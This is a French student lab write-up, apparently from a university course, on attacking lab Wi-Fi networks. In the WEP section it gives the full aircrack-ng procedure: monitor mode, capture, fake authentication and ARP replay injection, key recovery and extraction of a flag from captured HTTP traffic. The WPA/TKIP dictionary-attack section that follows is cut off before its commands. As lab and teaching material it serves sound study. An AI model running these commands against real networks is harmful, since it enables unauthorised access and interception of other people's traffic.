# R501-TP4 - Attaques Wifi

## 1 - Attaques d'un réseau WEP

1. Déterminer le canal du réseau R501-WEP et vérifier qu’il est bien configuré en WEP.

    ```bash
    sudo iw wlp0s20f0u3 scan | grep R501-WEP -A 16 -B 6
    ```

    nous donne:

    ```txt
      BSS b8:27:eb:d2:d5:f6(on wlp0s20f0u3)
      TSF: 635882552 usec (0d, 00:10:35)
      freq: 2432.0
      beacon interval: 100 TUs
      capability: ESS Privacy SpectrumMgmt ShortSlotTime (0x0511)
      signal: -31.00 dBm
      last seen: 0 ms ago
      Information elements from Probe Response frame:
      SSID: R501-WEP
      Supported rates: 1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 
      DS Parameter set: channel 5
      Country: CN	Environment: Indoor/Outdoor
        Channels [1 - 13] @ 20 dBm
      Power constraint: 0 dB
      TPC report: TX power: 15 dBm
      ERP: <no flags>
      Extended supported rates: 6.0 9.0 12.0 48.0 
      Extended capabilities:
        * Extended Channel Switching
      WMM:   * Parameter version 1
        * u-APSD
        * BE: CW 15-1023, AIFSN 3
        * BK: CW 15-1023, AIFSN 7
        * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
        * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
    ```

    l'AP utile le channel 5 pour communiquer.

2. Utiliser  `aircrack-ng`  pour cracker la clé WEP de ce réseau (sans utiliser de dictionnaire).
  Détailler toute la procédure

  - On passe notre carte en mode monitor:

    ```sh
    iwconfig <wireless-adapter> mode monitor
    ```

  - On switch de channel afin de pouvoir capturer les paquets:

    ```sh
    iw <wireless-adapter> set channel 5
    ```

  - ### Ecoute sur le channel 5

    On fait:

    ```sh
    airodump-ng -c 5 -w airod --output-format pcap --write-interval 15 --bssid b8:27:eb:d2:d5:f6 wlxc4e984180ca5
    ```

    qui nous donne:

    ```txt
    CH  5 ][ Elapsed: 6 mins ][ 2024-09-25 15:31 

    BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

    B8:27:EB:D2:D5:F6  -59 100     3586    69358    0   5   54e  WEP  WEP    OPN  R501-WEP                                                                                                                           

    BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

    B8:27:EB:D2:D5:F6  5E:CC:1E:90:20:C4  -47   54e- 1e     0     4063         R501-WEP                                                                                                                               
    B8:27:EB:D2:D5:F6  F6:A6:D3:1A:2A:28  -46    0 - 1      4       69                                                                                                                                                
    B8:27:EB:D2:D5:F6  A2:1E:5C:C4:AF:F2  -47    1 - 1      0     5759                                                                                                                                                
    B8:27:EB:D2:D5:F6  C4:E9:84:18:0C:7B  -28    0 - 1      2      135                                                                                                                                                
    B8:27:EB:D2:D5:F6  D8:44:89:03:43:6D  -38    1 - 1    199     7124                                                                                                                                                
    B8:27:EB:D2:D5:F6  C4:E9:84:18:0C:A5  -63    1 - 1      0    32927                                                                                                                                                
    B8:27:EB:D2:D5:F6  B8:27:EB:E3:0C:EE  -51    1e- 1e     0      414                                                                                                                                                
    B8:27:EB:D2:D5:F6  24:0A:C4:11:03:10  -54    5e- 1      0     6323                                                                                                                                                
    B8:27:EB:D2:D5:F6  C4:E9:84:18:67:E1  -47    1 - 1      0    76966                                                                                                                                                
    ```


  - ### Injection de paquets

    On fait:

    ```sh
    aireplay-ng -1 0 -b b8:27:eb:d2:d5:f6 -a b8:27:eb:d2:d5:f6 wlxc4e984180ca5
    ```

    qui nous donne:

    ```sh
    No source MAC (-h) specified. Using the device MAC (C4:E9:84:18:0C:A5)
    15:29:13  Waiting for beacon frame (BSSID: B8:27:EB:D2:D5:F6) on channel 5

    15:29:13  Sending Authentication Request (Open System) [ACK]
    15:29:13  Authentication successful
    15:29:13  Sending Association Request
    15:29:13  Got a deauthentication packet! (Waiting 3 seconds)

    15:29:16  Sending Authentication Request (Open System) [ACK]
    15:29:16  Authentication successful
    15:29:16  Sending Association Request [ACK]
    15:29:16  Association successful :-) (AID: 1)
    ```


  - ### Injection de paquets ARP

    On fait:

    ```
    aireplay-ng -3 -b b8:27:eb:d2:d5:f6 wlxc4e984180ca5
    ```

    qui nous donne:

    ```
    No source MAC (-h) specified. Using the device MAC (C4:E9:84:18:0C:A5)
    15:27:00  Waiting for beacon frame (BSSID: B8:27:EB:D2:D5:F6) on channel 5
    Saving ARP requests in replay_arp-0925-152700.cap
    You should also start airodump-ng to capture replies.
    103449 packets (got 55680 ARP requests and 16151 ACKs), sent 22888 packets...(500 pps)
    ```

  - ### Obtention de la clé WEP

    On fait:

    ```sh
    aircrack-ng -a 1 -b b8:27:eb:d2:d5:f6 ./airod-**.cap
    ```

    ce qui nous donne:

    ```txt
                                                                                                  Aircrack-ng 1.7 


                                                                                    [00:00:02] Tested 764 keys (got 66242 IVs)
                                                                                              Got 66687 out of 5000 IVsStarting PTW attack with 66687 ivs.
    KB    depth   byte(vote)
      0    2/  3   FA(77056) 28(76032) 58(75520) BD(75520) 0B(75264) 59(74752) 92(74752) E8(74752) 6D(73984) 74(73984) E9(73984) A7(73728) 68(73472) E3(73216) CA(72960) DC(72960) F0(72960) 
      1    3/  1   14(76544) 0F(75776) D6(75008) 49(74752) 51(74240) 20(73984) 8B(72704) C9(72704) F2(72704) 79(72448) FC(72448) A1(71936) DF(71936) FE(71680) 38(71424) C5(71424) F7(71424) 
      2    0/  1   28(93184) 02(78336) 0F(76544) E1(75776) 0C(75520) EB(74496) E4(73728) 9B(73472) 35(72960) 37(72960) C8(72704) 04(72448) E3(72448) 80(72192) 91(72192) 9D(72192) BB(72192) 
      3    4/  9   95(76544) C5(75264) 48(74496) A7(74496) 0B(74240) E9(73984) CB(73728) 1A(73216) 6B(73216) 8F(73216) B8(73216) 35(72960) 14(72704) 88(72448) 3D(72192) 50(72192) ED(72192) 
      4   32/  4   87(70656) 5A(70400) 76(70400) C1(70400) D4(70400) FC(70400) 80(70144) 8A(70144) A7(70144) EE(70144) FF(70144) CD(69888) 36(69632) 3F(69632) BA(69632) FA(69632) 1D(69376) 

      KEY FOUND! [ 53:61:74:75:72:6E:52:69:6E:67:24:38:38 ] (ASCII: SaturnRing$88 )
    Decrypted correctly: 100%
    ```

3. Capturer et retrouver le flag récupéré par le client de ce réseau Wifi.

  On récupère la flag avec la trame HTTP de `192.168.205.10` au serveur Apache, `192.168.205.1`.

  La réponse HTTP:

  ```
  GET /flag HTTP/1.1
  Host: 192.168.205.1
  User-Agent: ESP32HTTPClient
  Connection: keep-alive
  Accept-Encoding: identity;q=1,chunked;q=0.1,*;q=0

  HTTP/1.1 200 OK
  Date: Tue, 24 Sep 2024 15:22:40 GMT
  Server: Apache/2.4.62 (Debian)
  Last-Modified: Thu, 19 Sep 2024 12:56:03 GMT
  ETag: "21-6227871f269fc"
  Accept-Ranges: bytes
  Content-Length: 33
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive

  RTBZ{Old_W3P_S3cur1ty_1s_br0k3n}
  ```

  ce qui nous donne:

  ```html
  RTBZ{Old_W3P_S3cur1ty_1s_br0k3n}
  ```

## 2. Attaques d’un réseau TKIP/CCMP :

1. Vérifier que le réseau R501-TKIP est bien configuré en WPA-PSK et TKIP.

    ```bash 
    [lucas@fedora sheet-cheat]$ sudo iw wlp0s20f3 scan | grep R501-TKIP -A 12 -B 9
    ```

    ```txt
    BSS 00:3a:99:1d:9b:30(on wlp0s20f3)
      last seen: 4570.609s [boottime]
      TSF: 6152642617 usec (0d, 01:42:32)
      freq: 5580.0
      beacon interval: 100 TUs
      capability: ESS Privacy SpectrumMgmt (0x0111)
      signal: -55.00 dBm
      last seen: 1407 ms ago
      Information elements from Probe Response frame:
      SSID: R501-TKIP
      Supported rates: 6.0*9.0 12.0* 18.0 24.0*36.0 48.0 54.0
      WPA:  * Version: 1
        *Group cipher: TKIP
        * Pairwise ciphers: TKIP
        *Authentication suites: PSK
        * Capabilities: 4-PTKSA-RC 4-GTKSA-RC (0x0028)
      WMM:  *Parameter version 1
        * u-APSD
        *BE: CW 15-1023, AIFSN 3
        * BK: CW 15-1023, AIFSN 7
        *VI: CW 7-15, AIFSN 2, TXOP 3008 usec
        * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
    ```

2. Sachant que l’administrateur de ce réseau a paramétré un mot de passe faible
  (secret de seulement 8 digits -- uniquement des chiffres -- et sans doublons, soit 1814400 possibilités =10*9*8*7*6*5*4*3),
  créer un dictionnaire contenant tous les mots de passe possibles avec un script python.

3. Attaquer alors ce réseau, toujours avec aircrack-ng, avec uniquement la capture des trames EAPOL et le dictionnaire. Retrouver ensuite le flag dans les trames « 802.11 data ».
4. Vérifier que l’on peut faire pareil sur le réseau R501-CCMP.

    ```bash

